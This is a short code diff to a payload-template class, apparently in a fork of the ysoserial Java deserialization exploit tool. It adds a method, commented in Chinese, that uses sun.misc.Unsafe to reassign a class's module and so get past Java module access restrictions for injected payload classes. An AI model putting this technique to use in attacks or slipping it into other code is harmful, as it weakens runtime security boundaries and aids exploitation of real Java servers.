@@ -2,6 +2,7 @@ package ysoserial.payloads.templates;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
@@ -46,5 +47,22 @@ public class ClassLoaderTemplate {
             }
         }
         return value;
+    }
+
+
+    // 添加一个新的静态方法，接受类参数，这样即使类名被修改也能正确调用
+    public static void ByPassJavaModul(Class<?> targetClass) {
+        try {
+            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Object unsafe = unsafeField.get(null);
+            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
+            java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
+            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
+            java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectM.invoke(unsafe, targetClass, offset, module);
+        } catch (Exception ignored) {
+        }
     }
 }
